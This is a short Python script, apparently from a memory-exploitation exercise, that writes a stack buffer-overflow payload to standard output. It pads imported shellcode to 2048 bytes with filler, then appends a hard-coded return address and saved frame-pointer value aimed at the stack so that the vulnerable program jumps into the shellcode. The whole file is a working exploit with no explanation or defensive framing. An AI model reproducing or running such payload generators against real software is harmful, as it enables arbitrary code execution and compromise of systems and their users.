from shellcode import shellcode
import sys
blanks = b"\11" *  (2048 - len(shellcode))
sys.stdout.buffer.write(blanks)
sys.stdout.buffer.write(shellcode)
ebp_location = b"\x2c\xae\xf6\xff"
return_addr = b"\xe3\xad\xf6\xff"

sys.stdout.buffer.write(return_addr)
sys.stdout.buffer.write(ebp_location)